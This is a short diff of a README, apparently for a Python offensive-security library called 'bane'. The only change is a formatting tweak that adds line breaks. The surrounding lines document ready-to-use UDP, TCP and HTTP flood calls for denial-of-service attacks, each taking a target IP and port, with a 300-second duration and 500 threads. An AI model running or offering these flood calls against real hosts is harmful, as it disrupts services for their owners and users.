@@ -113,9 +113,9 @@ II-Usage:
 
 # DDoS:
 
-<br>UDP FLOOD:
+<br><br>UDP FLOOD:
 <br>bane.udp_flood(IP, p= port , min_size=10, max_size=20 , duration= 300 , interval=0.001)
-<br>TCP FLOOD:
+<br><br>TCP FLOOD:
 <br>bane.tcp_flood(IP, p= port , min_size=10, max_size=20 , duration= 300 ,interval=0.001 , threads=500)
-<br>HTTP FLOOD:
+<br><br>HTTP FLOOD:
 <br>bane.http_flood(IP, p= port , min_size=10, max_size=20 , duration= 300 ,interval=0.001 , threads=500)
